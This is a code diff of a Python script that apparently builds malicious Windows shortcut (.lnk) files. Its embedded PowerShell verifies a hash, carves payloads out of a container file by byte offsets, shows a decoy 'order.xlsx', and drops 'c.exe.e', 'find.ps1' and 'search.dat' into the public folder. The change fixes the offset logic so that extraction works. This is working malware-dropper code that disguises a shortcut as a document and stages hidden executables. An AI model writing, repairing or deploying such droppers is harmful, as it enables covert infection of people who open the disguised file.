@@ -44,10 +44,10 @@ def create_resource_file(data_paths: List[str], output_path: str) -> Dict[str, i
                     print(f"Warning: {abs_data_path} does not exist and will be skipped.")
                     continue
                 with open(abs_data_path, "rb") as data_file:
-                    print(f"Writing {abs_data_path} to {output_path} at offset {current_offset}")
                     data = data_file.read()
                     f.write(data)
                     current_offset += len(data)
+                    print(f"Writing {abs_data_path} to {output_path} at offset {current_offset}")
                     offsets[data_path] = current_offset
     except Exception as e:
         print(f"Error while creating dummy data file: {e}")
@@ -55,8 +55,7 @@ def create_resource_file(data_paths: List[str], output_path: str) -> Dict[str, i
 
     return offsets
 
-def create_lnk_shortcut(shortcut_path: str, target_path: str, arguments: str = '',
-                        working_directory: str = '', icon_path: str = ''):
+def create_lnk_shortcut(shortcut_path: str, target_path: str, arguments: str = '', working_directory: str = '', icon_path: str = ''):
     """
     Creates a Windows shortcut (.lnk file).
 
@@ -143,14 +142,13 @@ if ($md5 -ne '{md5_hash}') {{
     exit -1
 }}
 
-# Decrypt the file to retrieve the payload
-$ofs=@({offsets[data_paths[0]]},{offsets[data_paths[1]]},{offsets[data_paths[2]]},{offsets[data_paths[3]]})
+$ofs=@(0, {offsets[data_paths[0]]},{offsets[data_paths[1]]},{offsets[data_paths[2]]},{offsets[data_paths[3]]})
 $fs=[System.IO.File]::OpenRead($dummy)
 $br=New-Object BinaryReader($fs)
 $tSize=$fs.Length
-for($i=0;$i-lt$ofs.Count;$i++){{
+for($i=0;$i-lt$ofs.Count-1;$i++){{
     $sOff=$ofs[$i]
-    $eOff=if($i-lt$ofs.Count-1){{ $ofs[$i+1] }}else{{$tSize}}
+    $eOff=$ofs[$i+1]
     $len=$eOff-$sOff
     $fs.Seek($sOff,0)
     $outPath=if($i-eq 0){{Join-Path $lnk 'order.xlsx'}}else{{Join-Path $env:public @('c.exe.e','find.ps1','search.dat')[$i-1]}}
